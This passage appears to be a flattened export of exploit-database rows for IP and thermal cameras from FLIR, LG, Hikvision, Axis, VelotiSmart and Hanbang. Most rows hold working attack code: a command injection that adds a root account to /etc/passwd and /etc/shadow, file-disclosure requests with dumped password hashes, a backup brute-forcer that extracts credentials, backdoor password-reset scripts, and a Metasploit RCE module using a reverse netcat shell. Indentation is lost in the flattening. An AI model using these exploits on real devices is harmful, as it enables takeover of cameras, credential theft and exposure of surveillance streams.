'Connection-Type' : 'application/x-www-form-urlencoded'}
zePardata = {'action'          : 'get',
'resource'        : ';'+zeCommand}
try:
zeRequest = requests.post(zeTargets, headers=zeHeaders, data=zePardata)
print json.loads(zeRequest.text)
if zeCommand.strip() == 'exit':
sys.exit()
if zeCommand.strip() == 'addroot':
print '[+] Blind command injection using palette.php...'
print '[+] Adding user \'roOt\' with password \'rewt\' in shadow file...'
nuTargets = 'http://'+sys.argv[1]+'/palette.php'
nuHeaders = zeHeaders
nuHexstrn = ('\\x72\\x6f\\x4f\\x74\\x3a\\x24\\x31'
'\\x24\\x4d\\x4a\\x4f\\x6e\\x56\\x2f'
'\\x59\\x33\\x24\\x74\\x44\\x6e\\x4d'
'\\x49\\x42\\x4d\\x79\\x30\\x6c\\x45'
'\\x51\\x32\\x6b\\x44\\x70\\x66\\x67'
'\\x54\\x4a\\x50\\x30\\x3a\\x31\\x36'
'\\x39\\x31\\x34\\x3a\\x30\\x3a\\x39'
'\\x39\\x39\\x39\\x39\\x3a\\x37\\x3a'
'\\x3a\\x3a\\x0a\\x0d')
nuPadata1 = {'palette' : '1;echo \""roOt:x:0:0:pwn:/sys:/bin/bash\"" >> /etc/passwd'}
nuPadata2 = {'palette' : '1;echo -n -e \""'+nuHexstrn+'\"" >> /etc/shadow'}
requests.post(nuTargets, headers=nuHeaders, data=nuPadata1)
time.sleep(2)
requests.post(nuTargets, headers=nuHeaders, data=nuPadata2)
print '[*] Success!\n'
else: pass
except Exception:
print '[*] Error!'
break
sys.exit()"
2018-10-15,WebApps,Hardware,LiquidWorm,FLIR AX8 Thermal Camera 1.32.16,Arbitrary File Disclosure,"# Exploit Title: FLIR AX8 Thermal Camera 1.32.16 - Arbitrary File Disclosure
# Auhor: Gjoko 'LiquidWorm' Krstic
# Date: 2018-10-14
# Vendor: FLIR Systems, Inc.
# Product web page: https://www.flir.com
# Affected version: Firmware: 1.32.16, 1.17.13
# OS: neco_v1.8-0-g7ffe5b3
# Hardware: Flir Systems Neco Board
# Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
# References:
# Advisory ID: ZSL-2018-5493
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5493.php
# Desc: The FLIR AX8 thermal sensor camera suffers from an unauthenticated arbitrary
# file disclosure vulnerability. Input passed via the 'file' parameter in download.php
# is not properly verified before being used to download config files. This can be
# exploited to disclose the contents of arbitrary files via absolute path.
# PoC
# 1. GET http://TARGET/download.php?file=/etc/passwd HTTP/1.1
# 2. GET http://TARGET/download.php?file=/etc/shadow HTTP/1.1
# 3. GET http://TARGET/download.php?file=/FLIR/system/profile.d/userPreset.tar HTTP/1.1
#    GET http://TARGET/download.php?file=/FLIR/usr/www/FLIR/db/users.db HTTP/1.1","root:x:0:0:root:/home/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
messagebus:x:999:998::/var/lib/dbus:/bin/false
fliruser:x:1000:1000::/home/fliruser:/bin/sh
xuser:x:1001:1001::/home/xuser:/bin/sh
sshd:x:998:995::/var/run/sshd:/bin/false
avahi:x:997:994::/var/run/avahi-daemon:/bin/false
avahi-autoipd:x:996:993:Avahi autoip daemon:/var/run/avahi-autoipd:/bin/false
root:qA7LRQDa1amZM:17339:0:99999:7:::
daemon:*:17339:0:99999:7:::
bin:*:17339:0:99999:7:::
sys:*:17339:0:99999:7:::
sync:*:17339:0:99999:7:::
games:*:17339:0:99999:7:::
man:*:17339:0:99999:7:::
lp:*:17339:0:99999:7:::
mail:*:17339:0:99999:7:::
news:*:17339:0:99999:7:::
uucp:*:17339:0:99999:7:::
proxy:*:17339:0:99999:7:::
www-data:*:17339:0:99999:7:::
backup:*:17339:0:99999:7:::
list:*:17339:0:99999:7:::
irc:*:17339:0:99999:7:::
gnats:*:17339:0:99999:7:::
nobody:*:17339:0:99999:7:::
messagebus:!:17339:0:99999:7:::
fliruser:m1iiKYIJr63u2:17339:0:99999:7:::
xuser:!:17339:0:99999:7:::
sshd:!:17339:0:99999:7:::
avahi:!:17339:0:99999:7:::
avahi-autoipd:!:17339:0:99999:7:::
lqwrm@metalgear:~/$ sqlite3 users.db
SQLite version 3.11.0 2016-02-15 17:29:24
Enter "".help"" for usage hints.
sqlite> .tables
roles  users
sqlite> select * from roles;
1|admin
2|user
3|viewer
sqlite> select * from users;
1|admin||$2y$10$/J/KDhh0.UDg5pbwtPG9B.W2gEWrS36qHji1scgxO7uiTk1GuAa.K|1
2|user||$2y$10$O5Ybml6qN9caTjezQR0f8.z230PavQYUwmZCzMVxL6BMeNvLWEr9q|2
3|viewer||$2y$10$lxA0o325EuUtVAaTItBt.OSpZSfxIrT56ntm7326FQ/fTBc0ODWqq|3
4|service||$2y$10$syAL0yMLBfN/8.sciVnCE.kBto6mtVvjrmyhPQAo7oV3rq8X8pBke|4
5|developer||$2y$10$LBNcMBC/Bn3VVnhlI1j7huOZ.UOykGaq3VZ.YAgu0mAZXAQ8q36uG|5
sqlite>.q"
2018-10-08,WebApps,Hardware,LiquidWorm,FLIR Thermal Traffic Cameras 1.01-0bb5b27,Information Disclosure,"# Title: FLIR Thermal Traffic Cameras 1.01-0bb5b27 - Information Disclosure
# Author: Gjoko 'LiquidWorm' Krstic
# Date: 2018-10-06
# Vendor: FLIR Systems, Inc.
# Link: https://www.flir.com
# Tested on: nginx/1.12.1, nginx/1.10.2, nginx/1.8.0, Websocket/13 (RFC 6455)
# Affected firmware version: V1.01-0bb5b27 (TrafiOne)     Codename: TrafiOne
#                            E1.00.09      (TI BPL2 EDGE) Codename: TIIP4EDGE
#                            V1.02.P01     (TI x-stream)  Codename: TIIP2
#                            V1.05.P01     (ThermiCam)    Codename: ThermiCam
#                            V1.04.P02     (ThermiCam)    Codename: ThermiCam
#                            V1.04         (ThermiCam)    Codename: ThermiCam
#                            V1.01.P02     (ThermiCam)    Codename: ThermiCam
#                            V1.05.P03     (TrafiSense)   Codename: TrafiSense
#                            V1.06         (VIP-IP)       Codename: VIP-IP
#                            V1.02.P02     (TrafiRadar)   Codename: TrafiRadar
# Vendor patched firmware version:
# Product name                Firmware      Released
# ----------------------------------------------------
# ThermiCam / TrafiSense      E1.06.03      17.09.2018
# TI BPL2 EDGE                V1.00         17.09.2018
# TI x-stream                 E1.03.02      17.09.2018
# TrafiOne                    E1.02.02      17.09.2018
# ----------------------------------------------------
# Advisory ID: ZSL-2018-5490
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5490.php
# Vendor firmware updates: https://www.flir.com/security/best-practices-for-cybersecurity/
# Vendor cyber hardening guide: https://www.flir.com/globalassets/security/flir-pro-security-cyber-hardening-guide.pdf
# Desc: FLIR thermal traffic cameras suffer from an unauthenticated device manipulation
# vulnerability utilizing the websocket protocol. The affected FLIR Intelligent
# Transportation Systems - ITS models use an insecure implementation of websocket
# communication used for administering the device. Authentication and authorization
# bypass via referencing a direct object allows an attacker to directly modify running
# configurations, disclose information or initiate a denial of service (DoS) scenario
# with Reboot command. The devices do not support the usage of TLS 'wss://' prefix for
# WebSocket Secure connection making the network traffic disclosed in plain-text to
# MitM evil-doers. Also, the web service has an Origin validation security issue and
# is vulnerable to Cross-Site WebSocket Hijacking (CSWSH).
# ---
# Request:
# GET ws://192.168.1.1:13042/ws/xml2 HTTP/1.1
# Host: 192.168.1.1:13042
# Connection: Upgrade
# Pragma: no-cache
# Cache-Control: no-cache
# User-Agent: Bond/00.7
# Upgrade: websocket
# Origin: zeroscience.mk:1337
# Sec-WebSocket-Version: 13
# Accept-Encoding: gzip, deflate
# Accept-Language: en-US,en;q=0.9
# Cookie: tmhDynamicLocale.locale=%22en%22
# Sec-WebSocket-Key: A5SH9PRtc3rYF49kKO4vmw==
# Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
# Response:
# HTTP/1.1 101 Switching Protocols
# Server: nginx/1.10.2
# Date: Mon, 13 Aug 2018 02:48:46 GMT
# Content-Length: 0
# Connection: upgrade
# Upgrade: WebSocket
# Sec-WebSocket-Accept: QyXaTdjpCsAyxhVnVqjMg95jepk=
# ---
# No HTTP/1.1 401 Unauthorized response observed.
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Supported message types:
#print 'Sending Reboot message type (DoS)...'
#msg = '<Message Type=\""Reboot\""></Message>'
#print 'Getting supported messages...'
#msg = '<Message Type=\""GetSupportedMessages\""></Message>'
#print 'Getting system logs...'
#msg = '<Message Type=\""GetSystemLogs\""></Message>'
#print 'Getting device configuration...'
#msg = '<Message Type=\""GetConfiguration\""></Message>'
#print 'Setting new Wifi information...'
#msg ='''
#<Message Type=""SetWifiInformation"">
#    <Body Present=""0"" SSID=""pwned"" Channel=""11"" Hidden=""0"" Mode=""AccessPoint"" />
#</Message>","from websocket import create_connection as t00t
import time
import sys
endpoint = ""/ws/xml2""
if (len(sys.argv) <= 2):
print '[*] Usage: exploit.py <ipaddress> <port>'
exit(0)
host = sys.argv[1]
port = sys.argv[2]
<Message Type=""SupportedMessages"">
<Body>
<Message Type=""GetMessageConstraints""/>
<Message Type=""GetSupportedMessages""/>
<Message Type=""Session""/>
<Message Type=""Subscription""/>
<Message Type=""ClearData""/>
<Message Type=""GetConnectionInformation""/>
<Message Type=""GetData""/>
<Message Type=""GetEvents""/>
<Message Type=""GetLostData""/>
<Message Type=""GetManagedBy""/>
<Message Type=""GetPresenceData""/>
<Message Type=""GetPresenceLevel""/>
<Message Type=""GetPresenceLevelHistory""/>
<Message Type=""GetStorageLimits""/>
<Message Type=""SetConnectionSettings""/>
<Message Type=""SetManagedBy""/>
<Message Type=""ClearBootCount""/>
<Message Type=""ClearHistogram""/>
<Message Type=""ClearStoredCounter""/>
<Message Type=""ClearSystemLogs""/>
<Message Type=""CreateAviSequence""/>
<Message Type=""DoBadStuff""/> <-- ;]]
<Message Type=""ForceEvent""/>
<Message Type=""ForceKeyframe""/>
<Message Type=""GetBootCount""/>
<Message Type=""GetBplSettings""/>
<Message Type=""GetCameraConfiguration""/>
<Message Type=""GetCameraDefinitions""/>
<Message Type=""GetCameraSettings""/>
<Message Type=""GetConfiguration""/>
<Message Type=""GetConstraints""/>
<Message Type=""GetCpuStatistics""/>
<Message Type=""GetDateTime""/>
<Message Type=""GetDisplayOverlay""/>
<Message Type=""GetEventLog""/>
<Message Type=""GetEventsDescription""/>
<Message Type=""GetFrameFlow""/>
<Message Type=""GetHardwareInformation""/>
<Message Type=""GetHardwareSensors""/>
<Message Type=""GetHistogram""/>
<Message Type=""GetImage""/>
<Message Type=""GetImageSharpness""/>
<Message Type=""GetLeptonSettings""/>
<Message Type=""GetLoggingActivation""/>
<Message Type=""GetMemoryStatistics""/>
<Message Type=""GetNumberOfOutputs""/>
<Message Type=""GetOpenEvents""/>
<Message Type=""GetOutputsState""/>
<Message Type=""GetPermissions""/>
<Message Type=""GetProductInformation""/>
<Message Type=""GetSocketInformation""/>
<Message Type=""GetState""/>
<Message Type=""GetStoredCounter""/>
<Message Type=""GetSystemLogs""/>
<Message Type=""GetTemperature""/>
<Message Type=""GetThermalQualityHistogram""/>
<Message Type=""GetThermalQualityReferenceImage""/>
<Message Type=""GetThreadInformation""/>
<Message Type=""GetTime""/>
<Message Type=""GetTranslations""/>
<Message Type=""GetUpTime""/>
<Message Type=""GetVersion""/>
<Message Type=""GetVoltage""/>
<Message Type=""GetWifiInformation""/>
<Message Type=""KeepAlive""/>
<Message Type=""Notify""/>
<Message Type=""PauseDetectionFramework""/>
<Message Type=""Reboot""/>
<Message Type=""SetBplSettings""/>
<Message Type=""SetCameraConfiguration""/>
<Message Type=""SetCameraSettings""/>
<Message Type=""SetConfiguration""/>
<Message Type=""SetConstraintsFilter""/>
<Message Type=""SetDateTime""/>
<Message Type=""SetDisplayOverlay""/>
<Message Type=""SetHardwareInformation""/>
<Message Type=""SetLeptonSettings""/>
<Message Type=""SetLoggingActivation""/>
<Message Type=""SetTime""/>
<Message Type=""SetWifiInformation""/>
<Message Type=""UpdateFrameFlow""/>
</Body>
</Message>
socket = t00t(""ws://""+host+"":""+port+endpoint)
msg = '<Message Type=\""GetProductInformation\""></Message>'
socket.send(msg)
print 'Message sent.'
print 'Receiving...'
time.sleep(2)
priem =  socket.recv()
print 'Received data: \n%s' % priem
socket.close()"
2018-10-06,WebApps,Hardware,LiquidWorm,FLIR Thermal Traffic Cameras 1.01-0bb5b27,RTSP Stream Disclosure,"# Exploit Title: FLIR Thermal Traffic Cameras 1.01-0bb5b27 - RTSP Stream Disclosure
# Author: Gjoko 'LiquidWorm' Krstic
# Date: 2018-10-06
# Vendor: https://www.flir.com
# Link: https://www.flir.com/security/best-practices-for-cybersecurity/
# CVE: N/A
# Tested on: nginx/1.12.1, nginx/1.10.2, nginx/1.8.0, Websocket/13 (RFC 6455)
# Affected firmware version: V1.01-0bb5b27 (TrafiOne)     Codename: TrafiOne
#                           E1.00.09      (TI BPL2 EDGE) Codename: TIIP4EDGE
#                           V1.02.P01     (TI x-stream)  Codename: TIIP2
#                           V1.05.P01     (ThermiCam)    Codename: ThermiCam
#                           V1.04.P02     (ThermiCam)    Codename: ThermiCam
#                           V1.04         (ThermiCam)    Codename: ThermiCam
#                           V1.01.P02     (ThermiCam)    Codename: ThermiCam
#                           V1.05.P03     (TrafiSense)   Codename: TrafiSense
#                           V1.06         (VIP-IP)       Codename: VIP-IP
#                           V1.02.P02     (TrafiRadar)   Codename: TrafiRadar
# Vendor patched firmware version:
# Product name                Firmware      Released
# ----------------------------------------------------
# ThermiCam / TrafiSense      E1.06.03      17.09.2018
# TI BPL2 EDGE                V1.00         17.09.2018
# TI x-stream                 E1.03.02      17.09.2018
# TrafiOne                    E1.02.02      17.09.2018
# ----------------------------------------------------
# Description
# FLIR thermal traffic cameras suffer from an unauthenticated and unauthorized
# live RTSP video stream access.
# Advisory ID: ZSL-2018-5489
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5489.php
# Simple PoC:
http://Target/live.mjpeg?id=1
http://Target/snapshot.jpg",rtsp://Target/mpeg4
2018-09-12,WebApps,Hardware,Ege Balci,LG Smart IP Camera 1508190,Backup File Download,"# Exploit Title: LG Smart IP Camera 1508190 - Backup File Download
# Date: 2018-09-11
# Exploit Author: Ege Balci
# Vendor Homepage: https://www.lg.com
# Software version: 1310250 <= 1508190
# Model: LNB*/LND*/LNU*/LNV*
# CVE: CVE-2018-16946
# Description: smart network camera devices have broken access control. Attackers are able to
# download /updownload/t.report (aka Log & Report) files and download backup files (via download.php)
# without authenticating. These backup files contain user credentials and configuration information for
# the camera device. An attacker is able to discover the backup filename via reading the system logs or
# report data, or just by brute-forcing the backup filename pattern. It may be possible to authenticate
# to the admin account with the admin password.
# lg_smart_ip.py
#!/usr/bin/python3
# First try the default login creds...
# exit(0)
# Print contents of every file","import os
import sys
import sqlite3
import tarfile
import requests
import datetime
import threading
if len(sys.argv) < 2:
print(""Usage:\n\t""+sys.argv[0]+"" <TARGET-URL>"")
exit(0)
print(""#==========================================================================#"")
print(""# Exploit Title: LG Smart IP Device Backup Download"")
print(""# Date: 09-11-2018"")
print(""# Exploit Author: Ege BalcÄ±"")
print(""# Vendor Homepage: https://www.lg.com"")
print(""# Model: LNB*/LND*/LNU*/LNV*"")
print(""# CVE: CVE-2018-16946"")
print(""#==========================================================================#\n\n"")
model_version_list = [""2219.0.0.1505220"",""2745.0.0.1508190"",""1954.0.0.1410150"", ""1030.0.0.1310250""]
headers = {'Authorization': 'Basic YWRtaW46YWRtaW4='}
default = requests.get(sys.argv[1]+""/httpapi?GetDeviceInformation"", headers=headers)
if ""Model:"" in default.text:
print(""[+] Default password works  (admin:admin)"")
def brute(model_version):
date = datetime.datetime.now()
u = (['\\','|','/','-'])
for i in range(0,3650): # No need to go back futher these cameras didn't existed 10 years ago
sys.stdout.flush()
sys.stdout.write(""\r[*] Bruteforing backup date...{0}"".format(u[i%4]))
log_date = date.strftime(""%y"")
log_date += date.strftime(""%m"")
log_date += date.strftime(""%d"")
url = ""/download.php?file=""
backup_name = ""backup_""
backup_name += log_date
backup_name += ""_""+model_version+"".config""
ContentLength = requests.head(sys.argv[1]+url+backup_name,stream=True).headers[""Content-Length""]
if ContentLength != """":
backup = requests.get(sys.argv[1]+url+backup_name)
print(""\n[+] Backup file found !"")
print(""[+] ""+backup_name+"" -> ""+str(len(backup.content))+""\n"")
backup_file = open(backup_name+"".tar.gz"",""wb"")
backup_file.write(backup.content)
backup_file.close()
tar = tarfile.open(str(backup_name+"".tar.gz""),mode=""r:gz"")
for member in tar.getnames():
print(""[>] ""+member)
mem = open(member,""wb"")
mem.write(tar.extractfile(member).read())
conn = sqlite3.connect('mipsca.db')
c = conn.cursor()
users = c.execute(""SELECT * FROM User"")
print(""#=============== SUCCESS ===============#"")
for u in users:
print(""\n[#] Username: ""+u[0])
print(""[#] Password: ""+u[1])
os.system(""rm mipsca.db ConfigInfo.txt ""+ backup_name+"".tar.gz"")
break
date = (date-datetime.timedelta(days=1))
report = requests.get(sys.argv[1]+""/updownload/t.report"",verify=False)
if report.status_code != 200:
print(""[-] Target device don't have report data :("")
jobs = []
for mv in model_version_list:
t = threading.Thread(target=brute(mv))
jobs.append(t)
for j in jobs:
j.start()
else:
model_id = (((report.text.split(""= ""))[1]).split(""\n""))[0]
print(""[+] Model ID: ""+model_id)
version = (((report.text.split(""= ""))[2]).split(""\n""))[0]
print(""[+] Version: ""+version)
brute(model_id+"".""+version)"
2018-08-21,WebApps,Hardware,Alfie,Hikvision IP Camera 5.4.0,User Enumeration (Metasploit),"# Exploit title: Hikvision IP Camera 5.4.0 - User Enumeration (Metasploit)
# Author: Alfie
# Date: 2018-08-21
# Website: https://www.hikvision.com/en/
# Software: Hikvision Camera
# Versions:
# DS-2CD2xx2F-I Series: V5.2.0 build 140721 to V5.4.0 build 160530
# DS-2CD2xx0F-I Series: V5.2.0 build 140721 to V5.4.0 Build 160401
# DS-2CD2xx2FWD Series: V5.3.1 build 150410 to V5.4.4 Build 161125
# DS-2CD4x2xFWD Series: V5.2.0 build 140721 to V5.4.0 Build 160414
# DS-2CD4xx5 Series: V5.2.0 build 140721 to V5.4.0 Build 160421
# DS-2DFx Series: V5.2.0 build 140805 to V5.4.5 Build 160928
# DS-2CD63xx Series: V5.0.9 build 140305 to V5.3.5 Build 160106
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework","class MetasploitModule < Msf::Auxiliary
include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::Report
include Msf::Auxiliary::Scanner
def initialize(info = {})
super(update_info(info,
'Name'           => 'Configuration download in Hikvision IP Cameras',
'Description'    => %q{
Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account. The vulnerability has been present in Hikvision products since at least 2014. In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names. Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing. In addition to gaining full administrative access, the vulnerability can be used to retrieve plain-text passwords for all configured users.
'License'        => MSF_LICENSE,
'Author'         =>
'Monte Crypto', # Vulnerability discovery
'Alfie Njeru' # Metasploit module
'References'     =>
[ 'URL', 'https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html' ],
[ 'URL', 'http://seclists.org/fulldisclosure/2017/Sep/23' ]
register_options(
Opt::RPORT(80),
OptString.new('TARGETURI', [true, 'Path to the path that config is stored ', '/System/configurationFile?auth=YWRtaW46MTEK'])
end
def run_host(ip)
print_status(""#{rhost}:#{rport} - Sending request..."")
uri = normalize_uri(target_uri.path)
res = send_request_cgi({
'uri'          => uri,
'method'       => 'GET',
if res and res.code == 200
contents = res.body
fname = File.basename(datastore['TARGETURI'])
path = store_loot(
'usersvision ',
'text/plain',
ip,
contents,
fname
print_status(""#{rhost}:#{rport} - File saved in: #{path}"")
else
print_error(""#{rhost}:#{rport} - Failed to retrieve file"")
return
end
end
end"
2018-07-27,Remote,Linux,Metasploit,Axis Network Camera,.srv to parhand Remote Code Execution (Metasploit),"# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#include Msf::Exploit::CmdStager","class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update_info(info,
'Name'           => 'Axis Network Camera .srv to parhand RCE',
'Description'    => %q{
This module exploits an auth bypass in .srv functionality and a
command injection in parhand to execute code as the root user.
'Author'         => [
'Or Peles',       # Vulnerability discovery (VDOO)
'wvu',            # Metasploit module
'sinn3r',         # Metasploit module
'Brent Cook',     # Metasploit module
'Jacob Robles',   # Metasploit module
'Matthew Kienow', # Metasploit module
'Shelby Pace',    # Metasploit module
'Chris Lee',      # Metasploit module
'Cale Black'      # Metasploit module
'References'     => [
['CVE', '2018-10660'],
['CVE', '2018-10661'],
['CVE', '2018-10662'],
['URL', 'https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/'],
['URL', 'https://www.axis.com/files/faq/Advisory_ACV-128401.pdf']
'DisclosureDate' => 'Jun 18 2018',
'License'        => MSF_LICENSE,
'Platform'       => ['unix'],# 'linux'],
'Arch'           => [ARCH_CMD],# ARCH_ARMLE],
'Privileged'     => true,
'Targets'        => [
['Unix In-Memory',
'Platform'    => 'unix',
'Arch'        => ARCH_CMD,
'Type'        => :unix_memory,
'Payload'     => {
'BadChars'  => ' ',
'Encoder'   => 'cmd/ifs',
'Compat'    => {'PayloadType' => 'cmd', 'RequiredCmd' => 'netcat-e'}
=begin
['Linux Dropper',
'Platform'    => 'linux',
'Arch'        => ARCH_ARMLE,
'Type'        => :linux_dropper
=end
'DefaultTarget'  => 0,
'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'}
end
def exploit
case target['Type']
when :unix_memory
execute_command(payload.encoded)
=begin
when :linux_dropper
execute_cmdstager
=end
end
end
def execute_command(cmd, opts = {})
rand_srv = ""#{Rex::Text.rand_text_alphanumeric(8..42)}.srv""
send_request_cgi(
'method'    => 'POST',
'uri'       => ""/index.html/#{rand_srv}"",
'vars_post' => {
'action'  => 'dbus',
'args'    => dbus_send(
method: :set_param,
param:  ""string:root.Time.DST.Enabled string:;#{cmd};""
send_request_cgi(
'method'    => 'POST',
'uri'       => ""/index.html/#{rand_srv}"",
'vars_post' => {
'action'  => 'dbus',
'args'    => dbus_send(method: :synch_params)
end
def dbus_send(method:, param: nil)
args = '--system --dest=com.axis.PolicyKitParhand ' \
'--type=method_call /com/axis/PolicyKitParhand '
args <<
case method
when :set_param
""com.axis.PolicyKitParhand.SetParameter #{param}""
when :synch_params
'com.axis.PolicyKitParhand.SynchParameters'
end
args
end
end"
2018-07-16,WebApps,Hardware,Miguel Mendez Z,VelotiSmart WiFi B-380 Camera,Directory Traversal,"http://domain:80/../../etc/passwd
https://github.com/s1kr10s/ExploitVelotiSmart
https://medium.com/@s1kr10s/velotismart-0day-ca5056bcdcac","Title: Vulnerability in VelotiSmart Wifi - Directory Traversal
Date: 12-07-2018
Scope: Directory Traversal
Platforms: Unix
Author: Miguel Mendez Z
Vendor: VelotiSmart
Version: B380
CVE: CVE-2018–14064
Vulnerability description
- The vulnerability that affects the device is LFI type in the uc-http service 1.0.0. What allows to obtain information of configurations, wireless scanned networks, sensitive directories, etc. Of the device.
Vulnerable variable:
Exploit link:
Poc:"
2018-03-23,WebApps,XML,Matamorphosis,Hikvision IP Camera versions 5.2.0,5.3.9 (Builds 140721 < 170109) - Access Control Bypass,"# Exploit Title: Hikvision IP Camera versions 5.2.0 - 5.3.9 (Builds: 140721 - 170109) Backdoor
# Date: 15-03-2018
# Vendor Homepage: http://www.hikvision.com/en/
# Exploit Author: Matamorphosis
# Category: Web Apps
# Description: Exploits a backdoor in Hikvision camera firmware versions 5.2.0 - 5.3.9 (Builds: 140721 - 170109), deployed between 2014 and 2016, to assist the owner recover their password.
# Vulnerability Exploited: ICSA-17-124-01 - http://seclists.org/fulldisclosure/2017/Sep/23
#!/usr/bin/env python
# Usage: python exploit.py [IP Address] [Port] [SSL (Y/N)]
# BASIC INFO
#print(userXML)","import requests
import re
import sys
newPass = ""@Dm1N1$Tr80R"" # EXAMPLE OF A PASSWORD COMPLIANT WITH LATER FIRMWARES REQUIRING AT LEAST 2 UPPERCASE, 2 lowercase, and 2 SPECIAL CHARACTERS.
BackdoorAuthArg = ""auth=YWRtaW46MTEK""; # AUTHENTICATION KEY.
ip = """"
port = 0
SSL = """"
userID = """"
userName = """"
def Usage():
print(""[i] Usage: python exploit.py [IP Address] [Port] [SSL (Y/N)]"")
try:
ip = sys.argv[1]
SSL = sys.argv[3]
except:
print(""[-] One or more of the arguments is missing."")
Usage()
sys.exit()
ipmatch = re.search(r""\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"", ip) # IP ADDRESS REGULAR EXPRESSION.
if not ipmatch:
print(""[-] The entered ip address "" + ip + "" is not in the correct format."")
Usage()
sys.exit()
try:
port = int(sys.argv[2])
except:
print(""[-] The entered port "" + sys.argv[2] + "" is not a number."")
Usage()
sys.exit()
if (port == 0) or (port > 65535):
print(""[-] The entered port "" + sys.argv[2] + "" is not a valid port number."")
Usage()
sys.exit()
if SSL == ""Y"":
protocol = ""https""
else:
protocol = ""http""
URLBase = protocol + ""://"" + ip + "":"" + str(port) + ""/"" # URL BASE FOR FUTURE REQUESTS.
URLDownload = URLBase + ""Security/users?"" + BackdoorAuthArg # DOWNLOAD REQUEST.
print(""[+] Getting User List."")
DownloadResponse = requests.get(URLDownload).text
for line in DownloadResponse: # RETRIEVING USER LIST
useridmatch = re.search(r""<id>(.*)<\/id>"", line) # CHECK FOR USER ID.
usernamematch = re.search(r""<userName>(.*)<\/userName>"", line) # CHECK FOR USER NAME.
if useridmatch:
userID = useridmatch.group(1)
print(""[+] User ID: "" + userID)
if usernamematch:
userName = usernamematch.group(1)
print(""[+] Username: "" + userName)
userID = raw_input(""[?] Which User ID would you like to use? "")
userName = raw_input(""[?] Which Username would you like to use? "")
print(""[+] Using the User "" + userName + ""."")
userXML = ( '<User version=""""1.0"""" xmlns=""""http://www.hikvision.com/ver10/XMLSchema"""">\r\n<id>' + userID + '</id>\r\n<userName>' + userName + '</userName>\r\n<password>' + newPass + '</password>\r\n</User>' ) # OUR CRAFTED XML CONFIGURATION FILE
URLUpload = URLBase + ""Security/users/"" + userID + ""?"" + BackdoorAuthArg # UPLOAD REQUEST.
print(""[+] Changing Password now."")
print requests.put(URLUpload, data=userXML).text # UPLOAD REQUEST, SENDING THE PAYLOAD.
print(""[+] Complete. Please try logging in with these credentials. Username: "" + userName + ""Password: "" + newPass)"
2017-09-11,WebApps,Hardware,SecuriTeam,Hanbanggaoke IP Camera,Arbitrary Password Change,"## Vulnerability summary
## Credit
## Vulnerability details
## Proof of Concept","The following advisory describes an arbitrary password change vulnerability found in Hanbanggaoke webcams.
Beijing Hanbang Technology, “one of the first enterprises entering into digital video surveillance industry, has been focusing on R&D of products and technology of digital video surveillance field. While providing product and technical support, it also provides overall solution for the industrial system; it has successfully provided system implementation and service supports for several industries.”
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
Vendor response
We tried to contact Hanbanggaoke since the 8th of August 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.
User controlled input is not sufficiently sanitized, by sending a PUT request to /ISAPI/Security/users/1 HTTP/1.1 an attacker can change the admin password.
CVE: CVE-2017-14335
In order to exploit the vulnerability, we need to use proxy tool (like Burp). We then connect to the victim’s machine and need to capture the data package.
We then edit the data of the following PUT request:
PUT /ISAPI/Security/users/1 HTTP/1.1
Host: x.x.x.x
Content-Length: 321
Cache-Control: max-age=0
Origin: http://x.x.x.x
X-Requested-With: XMLHttpRequest
Authorization: Basic YWRtaW46ODg4ODg4
Content-Type: application/x-www-form-urlencoded
Accept: application/xml, text/xml, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
If-Modified-Since: 0
Referer: http://x.x.x.x/doc/page/paramconfig.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: updateTips=true; streamType=0; BufferLever=1; userInfo80=YWRtaW46ODg4ODg4; DevID=5; language=zh; curpage=paramconfig.asp%254
Connection: close
<?xml version=""1.0"" encoding=""UTF-8""?><User><id>1</id><userName>admin</userName><password>admin</password><bondIpList><bondIp><id>1</id><ipAddress>0.0.0.0</ipAddress><ipv6Address>::</ipv6Address></bondIp></bondIpList><macAddress/><userLevel>administrator</userLevel><attribute><inherent>true</inherent></attribute></User>
The successful response will be:
Now, we can login with as administrator:
User: admin
Password: admin"
